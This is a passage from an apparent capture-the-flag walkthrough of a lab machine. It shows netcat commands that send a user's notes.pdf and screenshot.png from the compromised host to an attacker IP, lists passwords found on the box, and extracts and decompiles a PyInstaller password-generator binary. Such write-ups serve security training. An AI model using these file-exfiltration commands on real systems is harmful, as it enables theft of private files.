<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 2 ethan  steven  4096 Aug 11 14:43 .</span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxrwxr-x</span> 3 steven steven  4096 Aug 11 14:43 ..</span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 ethan  steven 17567 Aug 10 18:42 notes.pdf</span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span> 1 ethan  steven 11864 May  2 21:36 screenshot.png</span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/home/steven/.notes$</span> nc <span class="at">-w3</span> 10.10.14.2 1234 <span class="op">&lt;</span> notes.pdf</span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-w3</span> 10.10.14.2 1234 <span class="op">&lt;</span> notes.pdf</span>
<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="ex">www-data@vessel:/home/steven/.notes$</span> nc <span class="at">-w3</span> 10.10.14.2 1234 <span class="op">&lt;</span> screenshot.png</span>
<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-w3</span> 10.10.14.2 1234 <span class="op">&lt;</span> screenshot.png</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><em>screenshot.png:</em></p>
<p><img src="images/vessel10.png" class="img-fluid"></p>
<p><em>notes.pdf:</em></p>
<p><img src="images/vessel11.png" class="img-fluid"></p>
<p>None of the three found passwords unlocks the file, and we are unable to crack the PDF using <code>pdf2john</code> and <code>john</code>.</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel cat password.txt </span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Vux8*ZF3rek94%NW</span></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="ex">daqvACHKvRn84VdVp</span></span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="ex">k</span><span class="op">&gt;</span>N4Hf6TmHE<span class="er">(</span><span class="ex">W]Uq</span><span class="st">"(RCj}V&gt;&amp;=rB</span><span class="va">$4</span><span class="st">}&lt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Nor does any of the passwords work to escalate privileges using <code>su</code> and/or <code>ssh</code>. With <em>screenshot.png</em> pointing towards the <code>passwordGenerator</code> we probably need to dig deeper here, maybe calculated passwords are stored within, passwords are generated in the same order or they are generated with a constant value making the seeming “random” password only having x amount of possible iteration.</p>
<p>Looking on the file with <code>strings</code> we can see that it was compiled using <code>PyInstaller</code>:</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  vessel strings passwordGenerator<span class="kw">|</span> <span class="fu">grep</span> <span class="at">-i</span> pyins</span>
<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Cannot</span> open PyInstaller archive from executable <span class="er">(</span><span class="ex">%s</span><span class="kw">)</span> <span class="ex">or</span> external archive <span class="er">(</span><span class="ex">%s</span><span class="kw">)</span></span>
<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="ex">PyInstaller:</span> FormatMessageW failed.</span>
<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="ex">PyInstaller:</span> pyi_win32_utils_to_utf8 failed.</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p><em>“PyInstaller reads a Python script written by you. It analyzes your code to discover every other module and library your script needs in order to execute. Then it collects copies of all those files – including the active Python interpreter! – and puts them with your script in a single folder, or optionally in a single executable file.”</em></p>
<p>Luckily for us, these files can be extracted using <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a>. Download pyinstxtractor to your Windows VM and extract the files from <code>passwordGenerator</code>.</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="ex">PS</span> C:<span class="dt">\t</span>ools<span class="dt">\p</span>yinstxtractor<span class="op">&gt;</span> python .<span class="dt">\p</span>yinstxtractor.py C:<span class="dt">\U</span>sers<span class="dt">\p</span>wn10<span class="dt">\D</span>ocuments<span class="dt">\h</span>tb<span class="dt">\v</span>essel<span class="dt">\p</span>asswordGenerator</span>
<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Processing C:<span class="dt">\U</span>sers<span class="dt">\p</span>wn10<span class="dt">\D</span>ocuments<span class="dt">\h</span>tb<span class="dt">\v</span>essel<span class="dt">\p</span>asswordGenerator</span>
<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Pyinstaller version: 2.1+</span>
<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Python version: 3.7</span>
<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Length of package: 34300131 bytes</span>
<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Found 95 files in CArchive</span>
<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Beginning extraction...please standby</span>
<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyiboot01_bootstrap.pyc</span>
<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyi_rth_subprocess.pyc</span>
<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyi_rth_pkgutil.pyc</span>
<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyi_rth_inspect.pyc</span>
<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyi_rth_pyside2.pyc</span>
<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: passwordGenerator.pyc</span>
<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[!]</span> Warning: This script is running in a different Python version than the one used to build the executable.</span>
<span id="cb23-15"><a href="#cb23-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[!]</span> Please run this script in Python 3.7 to prevent extraction errors during unmarshalling</span>
<span id="cb23-16"><a href="#cb23-16" aria-hidden="true" tabindex="-1"></a><span class="ex">[!]</span> Skipping pyz extraction</span>
<span id="cb23-17"><a href="#cb23-17" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Successfully extracted pyinstaller archive: C:<span class="dt">\U</span>sers<span class="dt">\p</span>wn10<span class="dt">\D</span>ocuments<span class="dt">\h</span>tb<span class="dt">\v</span>essel<span class="dt">\p</span>asswordGenerator</span>
<span id="cb23-18"><a href="#cb23-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-19"><a href="#cb23-19" aria-hidden="true" tabindex="-1"></a><span class="ex">You</span> can now use a python decompiler on the pyc files within the extracted directory</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Notice the python version 3.7, I’m running 3.10 making the output not accurate. Download and install python 3.7 and try again.</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">PS</span> C:<span class="dt">\t</span>ools<span class="dt">\p</span>yinstxtractor<span class="op">&gt;</span> python3.7.exe pyinstxtractor.py C:<span class="dt">\U</span>sers<span class="dt">\p</span>wn10<span class="dt">\D</span>ocuments<span class="dt">\h</span>tb<span class="dt">\v</span>essel<span class="dt">\p</span>asswordGenerator       <span class="pp">[</span><span class="ss">+</span><span class="pp">]</span> Processing C:<span class="dt">\U</span>sers<span class="dt">\p</span>wn10<span class="dt">\D</span>ocuments<span class="dt">\h</span>tb<span class="dt">\v</span>essel<span class="dt">\p</span>asswordGenerator</span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Pyinstaller version: 2.1+</span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Python version: 3.7</span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Length of package: 34300131 bytes</span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Found 95 files in CArchive</span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Beginning extraction...please standby</span>
<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyiboot01_bootstrap.pyc</span>
<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyi_rth_subprocess.pyc</span>
<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyi_rth_pkgutil.pyc</span>
<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyi_rth_inspect.pyc</span>
<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: pyi_rth_pyside2.pyc</span>
<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Possible entry point: passwordGenerator.pyc</span>
<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Found 142 files in PYZ archive</span>
<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Successfully extracted pyinstaller archive: C:<span class="dt">\U</span>sers<span class="dt">\p</span>wn10<span class="dt">\D</span>ocuments<span class="dt">\h</span>tb<span class="dt">\v</span>essel<span class="dt">\p</span>asswordGenerator</span>
<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a><span class="ex">You</span> can now use a python decompiler on the pyc files within the extracted directory</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>As stated on pyinstxtractor’s git, we now need to decompile the <code>.pyc</code> files, something we can do using <code>uncompyle6</code> or <code>decompyle3</code>.</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode python code-with-copy"><code class="sourceCode python"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a>PS C:\<span class="op">&gt;</span> pip3 install uncompyle6</span>
<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a>Collecting uncompyle6</span>
<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a>  Using cached uncompyle6<span class="op">-</span><span class="fl">3.8.0</span><span class="op">-</span>py310<span class="op">-</span>none<span class="op">-</span><span class="bu">any</span>.whl (<span class="dv">317</span> kB)</span>
<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>Requirement already satisfied: spark<span class="op">-</span>parser<span class="op">&lt;</span><span class="fl">1.9.0</span>,<span class="op">&gt;=</span><span class="fl">1.8.9</span> <span class="kw">in</span> c:\python310\lib\site<span class="op">-</span>packages (<span class="im">from</span> uncompyle6) (<span class="fl">1.8.9</span>)</span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a>Requirement already satisfied: xdis<span class="op">&lt;</span><span class="fl">6.1.0</span>,<span class="op">&gt;=</span><span class="fl">6.0.2</span> <span class="kw">in</span> c:\python310\lib\site<span class="op">-</span>packages (<span class="im">from</span> uncompyle6) (<span class="fl">6.0.4</span>)</span>
<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a>Requirement already satisfied: click <span class="kw">in</span> c:\python310\lib\site<span class="op">-</span>packages (<span class="im">from</span> spark<span class="op">-</span>parser<span class="op">&lt;</span><span class="fl">1.9.0</span>,<span class="op">&gt;=</span><span class="fl">1.8.9</span><span class="op">-&gt;</span>uncompyle6) (<span class="fl">8.1.3</span>)</span>
<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a>Requirement already satisfied: six<span class="op">&gt;=</span><span class="fl">1.10.0</span> <span class="kw">in</span> c:\python310\lib\site<span class="op">-</span>packages (<span class="im">from</span> xdis<span class="op">&lt;</span><span class="fl">6.1.0</span>,<span class="op">&gt;=</span><span class="fl">6.0.2</span><span class="op">-&gt;</span>uncompyle6) (<span class="fl">1.16.0</span>)</span>
<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a>Requirement already satisfied: colorama <span class="kw">in</span> c:\python310\lib\site<span class="op">-</span>packages (<span class="im">from</span> click<span class="op">-&gt;</span>spark<span class="op">-</span>parser<span class="op">&lt;</span><span class="fl">1.9.0</span>,<span class="op">&gt;=</span><span class="fl">1.8.9</span><span class="op">-&gt;</span>uncompyle6) (<span class="fl">0.4.5</span>)</span>
<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a>Installing collected packages: uncompyle6</span>
<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a>Successfully installed uncompyle6<span class="op">-</span><span class="fl">3.8.0</span></span>
<span id="cb25-11"><a href="#cb25-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-12"><a href="#cb25-12" aria-hidden="true" tabindex="-1"></a>PS C:\tools\pyinstxtractor\passwordGenerator_extracted<span class="op">&gt;</span> uncompyle6 passwordGenerator.pyc <span class="op">&gt;</span> passwordGenerator.py</span>
<span id="cb25-13"><a href="#cb25-13" aria-hidden="true" tabindex="-1"></a>PS C:\tools\pyinstxtractor\passwordGenerator_extracted<span class="op">&gt;</span> cat passwordGenerator.py</span>
<span id="cb25-14"><a href="#cb25-14" aria-hidden="true" tabindex="-1"></a><span class="co"># uncompyle6 version 3.8.0</span></span>
<span id="cb25-15"><a href="#cb25-15" aria-hidden="true" tabindex="-1"></a><span class="co"># Python bytecode 3.7.0 (3394)</span></span>
<span id="cb25-16"><a href="#cb25-16" aria-hidden="true" tabindex="-1"></a><span class="co"># Decompiled from: Python 3.10.1 (tags/v3.10.1:2cd268a, Dec  6 2021, 19:10:37) [MSC v.1929 64 bit (AMD64)]</span></span>
<span id="cb25-17"><a href="#cb25-17" aria-hidden="true" tabindex="-1"></a><span class="co"># Embedded file name: passwordGenerator.py</span></span>
<span id="cb25-18"><a href="#cb25-18" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> PySide2.QtCore <span class="im">import</span> <span class="op">*</span></span>
<span id="cb25-19"><a href="#cb25-19" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> PySide2.QtGui <span class="im">import</span> <span class="op">*</span></span>
<span id="cb25-20"><a href="#cb25-20" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> PySide2.QtWidgets <span class="im">import</span> <span class="op">*</span></span>
<span id="cb25-21"><a href="#cb25-21" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> PySide2 <span class="im">import</span> QtWidgets</span>
<span id="cb25-22"><a href="#cb25-22" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> pyperclip</span>
<span id="cb25-23"><a href="#cb25-23" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-24"><a href="#cb25-24" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> Ui_MainWindow(<span class="bu">object</span>):</span>
<span id="cb25-25"><a href="#cb25-25" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-26"><a href="#cb25-26" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> setupUi(<span class="va">self</span>, MainWindow):</span>
<span id="cb25-27"><a href="#cb25-27" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="kw">not</span> MainWindow.objectName():</span>
<span id="cb25-28"><a href="#cb25-28" aria-hidden="true" tabindex="-1"></a>            MainWindow.setObjectName(<span class="st">'MainWindow'</span>)</span>
<span id="cb25-29"><a href="#cb25-29" aria-hidden="true" tabindex="-1"></a>        MainWindow.resize(<span class="dv">560</span>, <span class="dv">408</span>)</span>
<span id="cb25-30"><a href="#cb25-30" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.centralwidget <span class="op">=</span> QWidget(MainWindow)</span>
<span id="cb25-31"><a href="#cb25-31" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.centralwidget.setObjectName(<span class="st">'centralwidget'</span>)</span>
<span id="cb25-32"><a href="#cb25-32" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.title <span class="op">=</span> QTextBrowser(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-33"><a href="#cb25-33" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.title.setObjectName(<span class="st">'title'</span>)</span>
<span id="cb25-34"><a href="#cb25-34" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.title.setGeometry(QRect(<span class="dv">80</span>, <span class="dv">10</span>, <span class="dv">411</span>, <span class="dv">51</span>))</span>
<span id="cb25-35"><a href="#cb25-35" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_2 <span class="op">=</span> QTextBrowser(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-36"><a href="#cb25-36" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_2.setObjectName(<span class="st">'textBrowser_2'</span>)</span>
<span id="cb25-37"><a href="#cb25-37" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_2.setGeometry(QRect(<span class="dv">10</span>, <span class="dv">80</span>, <span class="dv">161</span>, <span class="dv">41</span>))</span>
<span id="cb25-38"><a href="#cb25-38" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.generate <span class="op">=</span> QPushButton(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-39"><a href="#cb25-39" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.generate.setObjectName(<span class="st">'generate'</span>)</span>
<span id="cb25-40"><a href="#cb25-40" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.generate.setGeometry(QRect(<span class="dv">140</span>, <span class="dv">330</span>, <span class="dv">261</span>, <span class="dv">51</span>))</span>
<span id="cb25-41"><a href="#cb25-41" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.PasswordLength <span class="op">=</span> QSpinBox(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-42"><a href="#cb25-42" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.PasswordLength.setObjectName(<span class="st">'PasswordLength'</span>)</span>
<span id="cb25-43"><a href="#cb25-43" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.PasswordLength.setGeometry(QRect(<span class="dv">30</span>, <span class="dv">130</span>, <span class="dv">101</span>, <span class="dv">21</span>))</span>
<span id="cb25-44"><a href="#cb25-44" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.PasswordLength.setMinimum(<span class="dv">10</span>)</span>
<span id="cb25-45"><a href="#cb25-45" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.PasswordLength.setMaximum(<span class="dv">40</span>)</span>
<span id="cb25-46"><a href="#cb25-46" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.copyButton <span class="op">=</span> QPushButton(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-47"><a href="#cb25-47" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.copyButton.setObjectName(<span class="st">'copyButton'</span>)</span>
<span id="cb25-48"><a href="#cb25-48" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.copyButton.setGeometry(QRect(<span class="dv">460</span>, <span class="dv">260</span>, <span class="dv">71</span>, <span class="dv">61</span>))</span>
<span id="cb25-49"><a href="#cb25-49" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_4 <span class="op">=</span> QTextBrowser(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-50"><a href="#cb25-50" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_4.setObjectName(<span class="st">'textBrowser_4'</span>)</span>
<span id="cb25-51"><a href="#cb25-51" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_4.setGeometry(QRect(<span class="dv">190</span>, <span class="dv">170</span>, <span class="dv">141</span>, <span class="dv">41</span>))</span>
<span id="cb25-52"><a href="#cb25-52" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.checkBox <span class="op">=</span> QCheckBox(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-53"><a href="#cb25-53" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.checkBox.setObjectName(<span class="st">'checkBox'</span>)</span>
<span id="cb25-54"><a href="#cb25-54" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.checkBox.setGeometry(QRect(<span class="dv">250</span>, <span class="dv">220</span>, <span class="dv">16</span>, <span class="dv">17</span>))</span>
<span id="cb25-55"><a href="#cb25-55" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.checkBox.setCheckable(<span class="va">True</span>)</span>
<span id="cb25-56"><a href="#cb25-56" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.checkBox.setChecked(<span class="va">False</span>)</span>
<span id="cb25-57"><a href="#cb25-57" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.checkBox.setTristate(<span class="va">False</span>)</span>
<span id="cb25-58"><a href="#cb25-58" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox <span class="op">=</span> QComboBox(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-59"><a href="#cb25-59" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox.addItem(<span class="st">''</span>)</span>
<span id="cb25-60"><a href="#cb25-60" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox.addItem(<span class="st">''</span>)</span>
<span id="cb25-61"><a href="#cb25-61" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox.addItem(<span class="st">''</span>)</span>
<span id="cb25-62"><a href="#cb25-62" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox.setObjectName(<span class="st">'comboBox'</span>)</span>
<span id="cb25-63"><a href="#cb25-63" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.comboBox.setGeometry(QRect(<span class="dv">350</span>, <span class="dv">130</span>, <span class="dv">161</span>, <span class="dv">21</span>))</span>
<span id="cb25-64"><a href="#cb25-64" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_5 <span class="op">=</span> QTextBrowser(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-65"><a href="#cb25-65" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_5.setObjectName(<span class="st">'textBrowser_5'</span>)</span>
<span id="cb25-66"><a href="#cb25-66" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_5.setGeometry(QRect(<span class="dv">360</span>, <span class="dv">80</span>, <span class="dv">131</span>, <span class="dv">41</span>))</span>
<span id="cb25-67"><a href="#cb25-67" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.password_field <span class="op">=</span> QLineEdit(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-68"><a href="#cb25-68" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.password_field.setObjectName(<span class="st">'password_field'</span>)</span>
<span id="cb25-69"><a href="#cb25-69" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.password_field.setGeometry(QRect(<span class="dv">100</span>, <span class="dv">260</span>, <span class="dv">351</span>, <span class="dv">61</span>))</span>
<span id="cb25-70"><a href="#cb25-70" aria-hidden="true" tabindex="-1"></a>        MainWindow.setCentralWidget(<span class="va">self</span>.centralwidget)</span>
<span id="cb25-71"><a href="#cb25-71" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.statusbar <span class="op">=</span> QStatusBar(MainWindow)</span>
<span id="cb25-72"><a href="#cb25-72" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.statusbar.setObjectName(<span class="st">'statusbar'</span>)</span>
<span id="cb25-73"><a href="#cb25-73" aria-hidden="true" tabindex="-1"></a>        MainWindow.setStatusBar(<span class="va">self</span>.statusbar)</span>
<span id="cb25-74"><a href="#cb25-74" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.retranslateUi(MainWindow)</span>
<span id="cb25-75"><a href="#cb25-75" aria-hidden="true" tabindex="-1"></a>        QMetaObject.connectSlotsByName(MainWindow)</span>
<span id="cb25-76"><a href="#cb25-76" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb25-77"><a href="#cb25-77" aria-hidden="true" tabindex="-1"></a>    <span class="kw">def</span> retranslateUi(<span class="va">self</span>, MainWindow):</span>
<span id="cb25-78"><a href="#cb25-78" aria-hidden="true" tabindex="-1"></a>        MainWindow.setWindowTitle(QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'MainWindow'</span>, <span class="va">None</span>))</span>
<span id="cb25-79"><a href="#cb25-79" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.title.setDocumentTitle(<span class="st">''</span>)</span>
<span id="cb25-80"><a href="#cb25-80" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.title.setHtml(QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;</span><span class="ch">\n</span><span class="st">&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;</span><span class="ch">\n</span><span class="st">p, li { white-space: pre-wrap; }</span><span class="ch">\n</span><span class="st">&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:</span><span class="ch">\'</span><span class="st">MS Shell Dlg 2</span><span class="ch">\'</span><span class="st">; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;</span><span class="ch">\n</span><span class="st">&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:20pt;"&gt;Secure Password Generator&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>, <span class="va">None</span>))</span>
<span id="cb25-81"><a href="#cb25-81" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_2.setDocumentTitle(<span class="st">''</span>)</span>
<span id="cb25-82"><a href="#cb25-82" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_2.setHtml(QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd"&gt;</span><span class="ch">\n</span><span class="st">&lt;html&gt;&lt;head&gt;&lt;meta name="qrichtext" content="1" /&gt;&lt;style type="text/css"&gt;</span><span class="ch">\n</span><span class="st">p, li { white-space: pre-wrap; }</span><span class="ch">\n</span><span class="st">&lt;/style&gt;&lt;/head&gt;&lt;body style=" font-family:</span><span class="ch">\'</span><span class="st">MS Shell Dlg 2</span><span class="ch">\'</span><span class="st">; font-size:8.25pt; font-weight:400; font-style:normal;"&gt;</span><span class="ch">\n</span><span class="st">&lt;p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"&gt;&lt;span style=" font-size:14pt;"&gt;Password Length&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;'</span>, <span class="va">None</span>))</span>
<span id="cb25-83"><a href="#cb25-83" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.generate.setText(QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'Generate!'</span>, <span class="va">None</span>))</span>
<span id="cb25-84"><a href="#cb25-84" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.copyButton.setText(QCoreApplication.translate(<span class="st">'MainWindow'</span>, <span class="st">'Copy'</span>, <span class="va">None</span>))</span>
<span id="cb25-85"><a href="#cb25-85" aria-hidden="true" tabindex="-1"></a>        <span class="va">self</span>.textBrowser_4.setDocumentTitle(<span class="st">''</span>)</span>
